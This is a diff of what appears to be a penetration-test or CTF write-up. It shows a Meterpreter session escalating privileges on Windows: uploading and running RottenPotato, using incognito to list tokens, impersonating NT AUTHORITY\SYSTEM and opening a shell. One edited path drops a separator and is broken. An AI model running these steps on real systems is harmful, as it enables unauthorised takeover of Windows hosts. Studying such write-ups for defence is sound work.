@@ -605,13 +605,16 @@ Enabled Process Privileges
   SeIncreaseQuotaPrivilege
   SeIncreaseWorkingSetPrivilege
 
+
 meterpreter &gt; cd C:\\Users\\Sarah\\Desktop
 meterpreter &gt; upload rottenpotato.exe
-[*] uploading  : /root/Downloads/RottenPotato/rottenpotato.exe -&gt; rottenpotato.exe
-[*] uploaded   : /root/Downloads/RottenPotato/rottenpotato.exe -&gt; rottenpotato.exe
+[*] uploading  : rottenpotato.exe -&gt; rottenpotato.exe
+[*] uploaded   : rottenpotato.exe -&gt; rottenpotato.exe
+
 
 meterpreter &gt; load incognito
 Loading extension incognito...success.
+
 
 meterpreter &gt; list_tokens -u
 [-] Warning: Not currently running as SYSTEM, not all tokens will be available
@@ -625,9 +628,12 @@ Impersonation Tokens Available
 ========================================
 NT SERVICE\SQLSERVERAGENT
 
-meterpreter &gt; execute -Hc -f C:\\Temp\\rottenpotato.exe
+
+meterpreter &gt; execute -Hc -f C:\\Users\\Sarah\\Desktoprottenpotato.exe
 Process 7996 created.
 Channel 2 created.
+
+
 meterpreter &gt; list_tokens -u
 [-] Warning: Not currently running as SYSTEM, not all tokens will be available
              Call rev2self if primary process token is SYSTEM
@@ -641,11 +647,14 @@ Impersonation Tokens Available
 NT AUTHORITY\SYSTEM
 NT SERVICE\SQLSERVERAGENT
 
+
 meterpreter &gt; impersonate_token &#34;NT AUTHORITY\\SYSTEM&#34;
 [-] Warning: Not currently running as SYSTEM, not all tokens will be available
              Call rev2self if primary process token is SYSTEM
 [-] No delegation token available
 [+] Successfully impersonated user NT AUTHORITY\SYSTEM
+
+
 meterpreter &gt; shell
 Process 3452 created.
 Channel 3 created.
